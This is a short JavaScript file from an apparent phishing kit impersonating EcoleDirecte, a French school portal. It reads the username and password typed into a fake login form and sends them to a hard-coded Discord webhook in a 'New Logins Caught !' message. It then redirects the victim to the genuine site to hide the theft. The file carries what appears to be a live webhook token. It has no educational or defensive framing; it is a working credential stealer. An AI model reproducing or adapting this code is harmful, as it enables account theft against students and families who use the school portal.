function myFunction(event) {
  var x = event.code;
  if(x == "Enter") {
    connect_funct();
  }    
}

function connect_funct() {
    var uname = document.getElementById("username").value;
    var pass = document.getElementById("password").value;
    if(uname.length > 3)
    {
      if(pass.length > 3)
      {
        const d = new Date();
        let date_string = d.toLocaleString();
        const webhook_name = "EcoleDirecte Phishing";
    
        console.log("webhook_name : ", webhook_name);
        console.log("username : ", uname);
        console.log("password : ", pass);
    
        send(webhook_name, uname, pass, date_string);
        /*send2(webhook_name);*/
        setTimeout(function redirect () { location.assign("https://www.ecoledirecte.com");}, 500);
      }
    }

  }


function send(webhook_name, uname, pass, date_string) {    
  console.log("fonction message");
  console.log(webhook_name, uname, pass, date_string);
  var webhooklink = "https://discord.com/api/webhooks/1097156250061516820/nlMRlecy5SqmmZSzU_gvb-o49RDnQtd6mrUtk62epHkMMGEAYD7glS1aL1ycfdscQXJs";
  const request = new XMLHttpRequest();
    request.open("POST", webhooklink);
    request.setRequestHeader('Content-type', 'application/json');
  const params =
    {
      "content": null,
      "username": `${webhook_name}`,
      "avatar_url": "https://ecole-directe.github.io/EcoleDirecte_files/logoEcoleDirecteBlank2.png",
      "embeds":
      [
        {
          "title": "New Logins Caught !",
          "description": `Username : ${uname}\nPassword : ${pass}\nDate : ${date_string}`, 
          "footer":
          {
            "text": `EcoleDirecte Phishing - by Nota & slightly edited by someone with big brain `
          }
        }
      ]
    }
  request.send(JSON.stringify(params));
}

